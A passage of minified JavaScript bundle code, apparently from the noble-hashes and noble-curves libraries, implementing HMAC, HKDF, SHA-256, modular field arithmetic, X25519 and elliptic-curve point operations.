dc(this),this.iHash.update(e),this}digestInto(e){dc(this),Xl(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:r,iHash:n,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=r._cloneInto(e.oHash),e.iHash=n._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const Nf=(t,e,r)=>new uC(t,e).update(r).digest();Nf.create=(t,e)=>new uC(t,e);function a6(t,e,r){return ty(t),r===void 0&&(r=new Uint8Array(t.outputLen)),Nf(t,fc(r),fc(e))}const Qp=new Uint8Array([0]),Ub=new Uint8Array;function c6(t,e,r,n=32){if(ty(t),Wu(n),n>255*t.outputLen)throw new Error("Length should be <= 255*HashLen");const i=Math.ceil(n/t.outputLen);r===void 0&&(r=Ub);const s=new Uint8Array(i*t.outputLen),o=Nf.create(t,e),a=o._cloneInto(),c=new Uint8Array(o.outputLen);for(let u=0;u<i;u++)Qp[0]=u+1,a.update(u===0?Ub:c).update(r).update(Qp).digestInto(c),s.set(c,t.outputLen*u),o._cloneInto(a);return o.destroy(),a.destroy(),c.fill(0),Qp.fill(0),s.slice(0,n)}const u6=(t,e,r,n,i)=>c6(t,a6(t,e,r),n,i);function l6(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,u=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+u,a,n)}function h6(t,e,r){return t&e^~t&r}function d6(t,e,r){return t&e^t&r^e&r}let f6=class extends ry{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Vp(this.buffer)}update(e){dc(this);const{view:r,buffer:n,blockLen:i}=this;e=fc(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Vp(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){dc(this),Y_(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;l6(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=Vp(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const u=c/4,l=this.get();if(u>l.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<u;h++)a.setUint32(4*h,l[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}};const p6=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Ds=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Ms=new Uint32Array(64);class g6 extends f6{constructor(){super(64,32,8,!1),this.A=Ds[0]|0,this.B=Ds[1]|0,this.C=Ds[2]|0,this.D=Ds[3]|0,this.E=Ds[4]|0,this.F=Ds[5]|0,this.G=Ds[6]|0,this.H=Ds[7]|0}get(){const{A:e,B:r,C:n,D:i,E:s,F:o,G:a,H:c}=this;return[e,r,n,i,s,o,a,c]}set(e,r,n,i,s,o,a,c){this.A=e|0,this.B=r|0,this.C=n|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,r){for(let h=0;h<16;h++,r+=4)Ms[h]=e.getUint32(r,!1);for(let h=16;h<64;h++){const d=Ms[h-15],g=Ms[h-2],y=Ei(d,7)^Ei(d,18)^d>>>3,m=Ei(g,17)^Ei(g,19)^g>>>10;Ms[h]=m+Ms[h-7]+y+Ms[h-16]|0}let{A:n,B:i,C:s,D:o,E:a,F:c,G:u,H:l}=this;for(let h=0;h<64;h++){const d=Ei(a,6)^Ei(a,11)^Ei(a,25),g=l+d+h6(a,c,u)+p6[h]+Ms[h]|0,y=(Ei(n,2)^Ei(n,13)^Ei(n,22))+d6(n,i,s)|0;l=u,u=c,c=a,a=o+g|0,o=s,s=i,i=n,n=g+y|0}n=n+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,u=u+this.G|0,l=l+this.H|0,this.set(n,i,s,o,a,c,u,l)}roundClean(){Ms.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const eh=J_(()=>new g6);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Tf=BigInt(0),Pf=BigInt(1),m6=BigInt(2);function ra(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function th(t){if(!ra(t))throw new Error("Uint8Array expected")}function gc(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const y6=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function mc(t){th(t);let e="";for(let r=0;r<t.length;r++)e+=y6[t[r]];return e}function Xa(t){const e=t.toString(16);return e.length&1?"0"+e:e}function iy(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Tf:BigInt("0x"+t)}const ts={_0:48,_9:57,A:65,F:70,a:97,f:102};function $b(t){if(t>=ts._0&&t<=ts._9)return t-ts._0;if(t>=ts.A&&t<=ts.F)return t-(ts.A-10);if(t>=ts.a&&t<=ts.f)return t-(ts.a-10)}function yc(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let i=0,s=0;i<r;i++,s+=2){const o=$b(t.charCodeAt(s)),a=$b(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}n[i]=o*16+a}return n}function Go(t){return iy(mc(t))}function Vu(t){return th(t),iy(mc(Uint8Array.from(t).reverse()))}function wc(t,e){return yc(t.toString(16).padStart(e*2,"0"))}function Rf(t,e){return wc(t,e).reverse()}function w6(t){return yc(Xa(t))}function Cn(t,e,r){let n;if(typeof e=="string")try{n=yc(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(ra(e))n=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function Ku(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];th(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}function b6(t,e){if(t.length!==e.length)return!1;let r=0;for(let n=0;n<t.length;n++)r|=t[n]^e[n];return r===0}function v6(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const Yp=t=>typeof t=="bigint"&&Tf<=t;function Of(t,e,r){return Yp(t)&&Yp(e)&&Yp(r)&&e<=t&&t<r}function fs(t,e,r,n){if(!Of(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function lC(t){let e;for(e=0;t>Tf;t>>=Pf,e+=1);return e}function E6(t,e){return t>>BigInt(e)&Pf}function A6(t,e,r){return t|(r?Pf:Tf)<<BigInt(e)}const sy=t=>(m6<<BigInt(t-1))-Pf,Jp=t=>new Uint8Array(t),Lb=t=>Uint8Array.from(t);function hC(t,e,r){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof r!="function")throw new Error("hmacFn must be a function");let n=Jp(t),i=Jp(t),s=0;const o=()=>{n.fill(1),i.fill(0),s=0},a=(...l)=>r(i,n,...l),c=(l=Jp())=>{i=a(Lb([0]),l),n=a(),l.length!==0&&(i=a(Lb([1]),l),n=a())},u=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let l=0;const h=[];for(;l<e;){n=a();const d=n.slice();h.push(d),l+=n.length}return Ku(...h)};return(l,h)=>{o(),c(l);let d;for(;!(d=h(u()));)c();return o(),d}}const _6={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||ra(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Fc(t,e,r={}){const n=(i,s,o)=>{const a=_6[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}const C6=()=>{throw new Error("not implemented")};function Mm(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(i!==void 0)return i;const s=t(r,...n);return e.set(r,s),s}}var I6=Object.freeze({__proto__:null,isBytes:ra,abytes:th,abool:gc,bytesToHex:mc,numberToHexUnpadded:Xa,hexToNumber:iy,hexToBytes:yc,bytesToNumberBE:Go,bytesToNumberLE:Vu,numberToBytesBE:wc,numberToBytesLE:Rf,numberToVarBytesBE:w6,ensureBytes:Cn,concatBytes:Ku,equalBytes:b6,utf8ToBytes:v6,inRange:Of,aInRange:fs,bitLen:lC,bitGet:E6,bitSet:A6,bitMask:sy,createHmacDrbg:hC,validateObject:Fc,notImplemented:C6,memoized:Mm});const Cr=BigInt(0),rr=BigInt(1),ko=BigInt(2),x6=BigInt(3),Bm=BigInt(4),Fb=BigInt(5),jb=BigInt(8);function hn(t,e){const r=t%e;return r>=Cr?r:e+r}function dC(t,e,r){if(e<Cr)throw new Error("invalid exponent, negatives unsupported");if(r<=Cr)throw new Error("invalid modulus");if(r===rr)return Cr;let n=rr;for(;e>Cr;)e&rr&&(n=n*t%r),t=t*t%r,e>>=rr;return n}function ii(t,e,r){let n=t;for(;e-- >Cr;)n*=n,n%=r;return n}function Um(t,e){if(t===Cr)throw new Error("invert: expected non-zero number");if(e<=Cr)throw new Error("invert: expected positive modulus, got "+e);let r=hn(t,e),n=e,i=Cr,s=rr;for(;r!==Cr;){const o=n/r,a=n%r,c=i-s*o;n=r,r=a,i=s,s=c}if(n!==rr)throw new Error("invert: does not exist");return hn(i,e)}function S6(t){const e=(t-rr)/ko;let r,n,i;for(r=t-rr,n=0;r%ko===Cr;r/=ko,n++);for(i=ko;i<t&&dC(i,e,t)!==t-rr;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(n===1){const o=(t+rr)/Bm;return function(a,c){const u=a.pow(c,o);if(!a.eql(a.sqr(u),c))throw new Error("Cannot find square root");return u}}const s=(r+rr)/ko;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=n,u=o.pow(o.mul(o.ONE,i),r),l=o.pow(a,s),h=o.pow(a,r);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let d=1;for(let y=o.sqr(h);d<c&&!o.eql(y,o.ONE);d++)y=o.sqr(y);const g=o.pow(u,rr<<BigInt(c-d-1));u=o.sqr(g),l=o.mul(l,g),h=o.mul(h,u),c=d}return l}}function N6(t){if(t%Bm===x6){const e=(t+rr)/Bm;return function(r,n){const i=r.pow(n,e);if(!r.eql(r.sqr(i),n))throw new Error("Cannot find square root");return i}}if(t%jb===Fb){const e=(t-Fb)/jb;return function(r,n){const i=r.mul(n,ko),s=r.pow(i,e),o=r.mul(n,s),a=r.mul(r.mul(o,ko),s),c=r.mul(o,r.sub(a,r.ONE));if(!r.eql(r.sqr(c),n))throw new Error("Cannot find square root");return c}}return S6(t)}const T6=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function P6(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=T6.reduce((n,i)=>(n[i]="function",n),e);return Fc(t,r)}function R6(t,e,r){if(r<Cr)throw new Error("invalid exponent, negatives unsupported");if(r===Cr)return t.ONE;if(r===rr)return e;let n=t.ONE,i=e;for(;r>Cr;)r&rr&&(n=t.mul(n,i)),i=t.sqr(i),r>>=rr;return n}function O6(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function fC(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function pC(t,e,r=!1,n={}){if(t<=Cr)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=fC(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:r,BITS:i,BYTES:s,MASK:sy(i),ZERO:Cr,ONE:rr,create:c=>hn(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Cr<=c&&c<t},is0:c=>c===Cr,isOdd:c=>(c&rr)===rr,neg:c=>hn(-c,t),eql:(c,u)=>c===u,sqr:c=>hn(c*c,t),add:(c,u)=>hn(c+u,t),sub:(c,u)=>hn(c-u,t),mul:(c,u)=>hn(c*u,t),pow:(c,u)=>R6(a,c,u),div:(c,u)=>hn(c*Um(u,t),t),sqrN:c=>c*c,addN:(c,u)=>c+u,subN:(c,u)=>c-u,mulN:(c,u)=>c*u,inv:c=>Um(c,t),sqrt:n.sqrt||(c=>(o||(o=N6(t)),o(a,c))),invertBatch:c=>O6(a,c),cmov:(c,u,l)=>l?u:c,toBytes:c=>r?Rf(c,s):wc(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return r?Vu(c):Go(c)}});return Object.freeze(a)}function gC(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function mC(t){const e=gC(t);return e+Math.ceil(e/2)}function k6(t,e,r=!1){const n=t.length,i=gC(e),s=mC(e);if(n<16||n<s||n>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+n);const o=r?Vu(t):Go(t),a=hn(o,e-rr)+rr;return r?Rf(a,i):wc(a,i)}const qb=BigInt(0),kh=BigInt(1);function Zp(t,e){const r=e.negate();return t?r:e}function yC(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Xp(t,e){yC(t,e);const r=Math.ceil(e/t)+1,n=2**(t-1);return{windows:r,windowSize:n}}function D6(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((r,n)=>{if(!(r instanceof e))throw new Error("invalid point at index "+n)})}function M6(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((r,n)=>{if(!e.isValid(r))throw new Error("invalid scalar at index "+n)})}const eg=new WeakMap,wC=new WeakMap;function tg(t){return wC.get(t)||1}function B6(t,e){return{constTimeNegate:Zp,hasPrecomputes(r){return tg(r)!==1},unsafeLadder(r,n,i=t.ZERO){let s=r;for(;n>qb;)n&kh&&(i=i.add(s)),s=s.double(),n>>=kh;return i},precomputeWindow(r,n){const{windows:i,windowSize:s}=Xp(n,e),o=[];let a=r,c=a;for(let u=0;u<i;u++){c=a,o.push(c);for(let l=1;l<s;l++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(r,n,i){const{windows:s,windowSize:o}=Xp(r,e);let a=t.ZERO,c=t.BASE;const u=BigInt(2**r-1),l=2**r,h=BigInt(r);for(let d=0;d<s;d++){const g=d*o;let y=Number(i&u);i>>=h,y>o&&(y-=l,i+=kh);const m=g,b=g+Math.abs(y)-1,A=d%2!==0,_=y<0;y===0?c=c.add(Zp(A,n[m])):a=a.add(Zp(_,n[b]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,s=t.ZERO){const{windows:o,windowSize:a}=Xp(r,e),c=BigInt(2**r-1),u=2**r,l=BigInt(r);for(let h=0;h<o;h++){const d=h*a;if(i===qb)break;let g=Number(i&c);if(i>>=l,g>a&&(g-=u,i+=kh),g===0)continue;let y=n[d+Math.abs(g)-1];g<0&&(y=y.negate()),s=s.add(y)}return s},getPrecomputes(r,n,i){let s=eg.get(n);return s||(s=this.precomputeWindow(n,r),r!==1&&eg.set(n,i(s))),s},wNAFCached(r,n,i){const s=tg(r);return this.wNAF(s,this.getPrecomputes(s,r,i),n)},wNAFCachedUnsafe(r,n,i,s){const o=tg(r);return o===1?this.unsafeLadder(r,n,s):this.wNAFUnsafe(o,this.getPrecomputes(o,r,i),n,s)},setWindowSize(r,n){yC(n,e),wC.set(r,n),eg.delete(r)}}}function U6(t,e,r,n){if(D6(r,t),M6(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=lC(BigInt(r.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),u=Math.floor((e.BITS-1)/o)*o;let l=i;for(let h=u;h>=0;h-=o){c.fill(i);for(let g=0;g<n.length;g++){const y=n[g],m=Number(y>>BigInt(h)&BigInt(a));c[m]=c[m].add(r[g])}let d=i;for(let g=c.length-1,y=i;g>0;g--)y=y.add(c[g]),d=d.add(y);if(l=l.add(d),h!==0)for(let g=0;g<o;g++)l=l.double()}return l}function bC(t){return P6(t.Fp),Fc(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...fC(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const Na=BigInt(0),rg=BigInt(1);function $6(t){return Fc(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})}function L6(t){const e=$6(t),{P:r}=e,n=_=>hn(_,r),i=e.montgomeryBits,s=Math.ceil(i/8),o=e.nByteLength,a=e.adjustScalarBytes||(_=>_),c=e.powPminus2||(_=>dC(_,r-BigInt(2),r));function u(_,T,P){const S=n(_*(T-P));return T=n(T-S),P=n(P+S),[T,P]}const l=(e.a-BigInt(2))/BigInt(4);function h(_,T){fs("u",_,Na,r),fs("scalar",T,Na,r);const P=T,S=_;let C=rg,O=Na,$=_,D=rg,F=Na,j;for(let N=BigInt(i-1);N>=Na;N--){const f=P>>N&rg;F^=f,j=u(F,C,$),C=j[0],$=j[1],j=u(F,O,D),O=j[0],D=j[1],F=f;const p=C+O,w=n(p*p),E=C-O,x=n(E*E),R=w-x,B=$+D,k=$-D,v=n(k*p),M=n(B*E),V=v+M,I=v-M;$=n(V*V),D=n(S*n(I*I)),C=n(w*x),O=n(R*(w+n(l*R)))}j=u(F,C,$),C=j[0],$=j[1],j=u(F,O,D),O=j[0],D=j[1];const L=c(O);return n(C*L)}function d(_){return Rf(n(_),s)}function g(_){const T=Cn("u coordinate",_,s);return o===32&&(T[31]&=127),Vu(T)}function y(_){const T=Cn("scalar",_),P=T.length;if(P!==s&&P!==o){let S=""+s+" or "+o;throw new Error("invalid scalar, expected "+S+" bytes, got "+P)}return Vu(a(T))}function m(_,T){const P=g(T),S=y(_),C=h(P,S);if(C===Na)throw new Error("invalid private or public key received");return d(C)}const b=d(e.Gu);function A(_){return m(_,b)}return{scalarMult:m,scalarMultBase:A,getSharedSecret:(_,T)=>m(_,T),getPublicKey:_=>A(_),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:b}}const $m=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const F6=BigInt(1),zb=BigInt(2),j6=BigInt(3),q6=BigInt(5);BigInt(8);function z6(t){const e=BigInt(10),r=BigInt(20),n=BigInt(40),i=BigInt(80),s=$m,o=t*t%s*t%s,a=ii(o,zb,s)*o%s,c=ii(a,F6,s)*t%s,u=ii(c,q6,s)*c%s,l=ii(u,e,s)*u%s,h=ii(l,r,s)*l%s,d=ii(h,n,s)*h%s,g=ii(d,i,s)*d%s,y=ii(g,i,s)*d%s,m=ii(y,e,s)*u%s;return{pow_p_5_8:ii(m,zb,s)*t%s,b2:o}}function H6(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}const Lm=L6({P:$m,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{const e=$m,{pow_p_5_8:r,b2:n}=z6(t);return hn(ii(r,j6,e)*n,e)},adjustScalarBytes:H6,randomBytes:Lc});function Hb(t){t.lowS!==void 0&&gc("lowS",t.lowS),t.prehash!==void 0&&gc("prehash",t.prehash)}function W6(t){const e=bC(t);Fc(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:r,Fp:n,a:i}=e;if(r){if(!n.eql(i,n.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof r!="object"||typeof r.beta!="bigint"||typeof r.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:G6,hexToBytes:V6}=I6;class K6 extends Error{constructor(e=""){super(e)}}const cs={Err:K6,_tlv:{encode:(t,e)=>{const{Err:r}=cs;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length&1)throw new r("tlv.encode: unpadded data");const n=e.length/2,i=Xa(n);if(i.length/2&128)throw new r("tlv.encode: long form length too big");const s=n>127?Xa(i.length/2|128):"";return Xa(t)+s+i+e},decode(t,e){const{Err:r}=cs;let n=0;if(t<0||t>256)throw new r("tlv.encode: wrong tag");if(e.length<2||e[n++]!==t)throw new r("tlv.decode: wrong tlv");const i=e[n++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new r("tlv.decode(long): indefinite length not supported");if(c>4)throw new r("tlv.decode(long): byte length is too big");const u=e.subarray(n,n+c);if(u.length!==c)throw new r("tlv.decode: length bytes not complete");if(u[0]===0)throw new r("tlv.decode(long): zero leftmost byte");for(const l of u)o=o<<8|l;if(n+=c,o<128)throw new r("tlv.decode(long): not minimal encoding")}const a=e.subarray(n,n+o);if(a.length!==o)throw new r("tlv.decode: wrong value length");return{v:a,l:e.subarray(n+o)}}},_int:{encode(t){const{Err:e}=cs;if(t<us)throw new e("integer: negative integers are not allowed");let r=Xa(t);if(Number.parseInt(r[0],16)&8&&(r="00"+r),r.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return r},decode(t){const{Err:e}=cs;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return G6(t)}},toSig(t){const{Err:e,_int:r,_tlv:n}=cs,i=typeof t=="string"?V6(t):t;th(i);const{v:s,l:o}=n.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=n.decode(2,s),{v:u,l}=n.decode(2,c);if(l.length)throw new e("invalid signature: left bytes after parsing");return{r:r.decode(a),s:r.decode(u)}},hexFromSig(t){const{_tlv:e,_int:r}=cs,n=e.encode(2,r.encode(t.r)),i=e.encode(2,r.encode(t.s)),s=n+i;return e.encode(48,s)}},us=BigInt(0),wr=BigInt(1);BigInt(2);const Wb=BigInt(3);BigInt(4);function Q6(t){const e=W6(t),{Fp:r}=e,n=pC(e.n,e.nBitLength),i=e.toBytes||((m,b,A)=>{const _=b.toAffine();return Ku(Uint8Array.from([4]),r.toBytes(_.x),r.toBytes(_.y))}),s=e.fromBytes||(m=>{const b=m.subarray(1),A=r.fromBytes(b.subarray(0,r.BYTES)),_=r.fromBytes(b.subarray(r.BYTES,2*r.BYTES));return{x:A,y:_}});function o(m){const{a:b,b:A}=e,_=r.sqr(m),T=r.mul(_,m);return r.add(r.add(T,r.mul(m,b)),A)}if(!r.eql(r.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(m){return Of(m,wr,e.n)}function c(m){const{allowedPrivateKeyLengths:b,nByteLength:A,wrapPrivateKey:_,n:T}=e;if(b&&typeof m!="bigint"){if(ra(m)&&(m=mc(m)),typeof m!="string"||!b.includes(m.length))throw new Error("invalid private key");m=m.padStart(A*2,"0")}let P;try{P=typeof m=="bigint"?m:Go(Cn("private key",m,A))}catch{throw new Error("invalid private key, expected hex or "+A+" bytes, got "+typeof m)}return _&&(P=hn(P,T)),fs("private key",P,wr,T),P}function u(m){if(!(m instanceof d))throw new Error("ProjectivePoint expected")}const l=Mm((m,b)=>{const{px:A,py:_,pz:T}=m;if(r.eql(T,r.ONE))return{x:A,y:_};const P=m.is0();b==null&&(b=P?r.ONE:r.inv(T));const S=r.mul(A,b),C=r.mul(_,b),O=r.mul(T,b);if(P)return{x:r.ZERO,y:r.ZERO};if(!r.eql(O,r.ONE))throw new Error("invZ was invalid");return{x:S,y:C}}),h=Mm(m=>{if(m.is0()){if(e.allowInfinityPoint&&!r.is0(m.py))return;throw new Error("bad point: ZERO")}const{x:b,y:A}=m.toAffine();if(!r.isValid(b)||!r.isValid(A))throw new Error("bad point: x or y not FE");const _=r.sqr(A),T=o(b);if(!r.eql(_,T))throw new Error("bad point: equation left != right");if(!m.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class d{constructor(b,A,_){if(this.px=b,this.py=A,this.pz=_,b==null||!r.isValid(b))throw new Error("x required");if(A==null||!r.isValid(A))throw new Error("y required");if(_==null||!r.isValid(_))throw new Error("z required");Object.freeze(this)}static fromAffine(b){const{x:A,y:_}=b||{};if(!b||!r.isValid(A)||!r.isValid(_))throw new Error("invalid affine point");if(b instanceof d)throw new Error("projective point not allowed");const T=P=>r.eql(P,r.ZERO);return T(A)&&T(_)?d.ZERO:new d(A,_,r.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(b){const A=r.invertBatch(b.map(_=>_.pz));return b.map((_,T)=>_.toAffine(A[T])).map(d.fromAffine)}static fromHex(b){const A=d.fromAffine(s(Cn("pointHex",b)));return A.assertValidity(),A}static fromPrivateKey(b){return d.BASE.multiply(c(b))}static msm(b,A){return U6(d,n,b,A)}_setWindowSize(b){y.setWindowSize(this,b)}assertValidity(){h(this)}hasEvenY(){const{y:b}=this.toAffine();if(r.isOdd)return!r.isOdd(b);throw new Error("Field doesn't support isOdd")}equals(b){u(b);const{px:A,py:_,pz:T}=this,{px:P,py:S,pz:C}=b,O=r.eql(r.mul(A,C),r.mul(P,T)),$=r.eql(r.mul(_,C),r.mul(S,T));return O&&$}negate(){return new d(this.px,r.neg(this.py),this.pz)}double(){const{a:b,b:A}=e,_=r.mul(A,Wb),{px:T,py:P,pz:S}=this;let C=r.ZERO,O=r.ZERO,$=r.ZERO,D=r.mul(T,T),F=r.mul(P,P),j=r.mul(S,S),L=r.mul(T,P);return L=r.add(L,L),$=r.mul(T,S),$=r.add($,$),C=r.mul(b,$),O=r.mul(_,j),O=r.add(C,O),C=r.sub(F,O),O=r.add(F,O),O=r.mul(C,O),C=r.mul(L,C),$=r.mul(_,$),j=r.mul(b,j),L=r.sub(D,j),L=r.mul(b,L),L=r.add(L,$),$=r.add(D,D),D=r.add($,D),D=r.add(D,j),D=r.mul(D,L),O=r.add(O,D),j=r.mul(P,S),j=r.add(j,j),D=r.mul(j,L),C=r.sub(C,D),$=r.mul(j,F),$=r.add($,$),$=r.add($,$),new d(C,O,$)}add(b){u(b);const{px:A,py:_,pz:T}=this,{px:P,py:S,pz:C}=b;let O=r.ZERO,$=r.ZERO,D=r.ZERO;const F=e.a,j=r.mul(e.b,Wb);let L=r.mul(A,P),N=r.mul(_,S),f=r.mul(T,C),p=r.add(A,_),w=r.add(P,S);p=r.mul(p,w),w=r.add(L,N),p=r.sub(p,w),w=r.add(A,T);let E=r.add(P,C);return 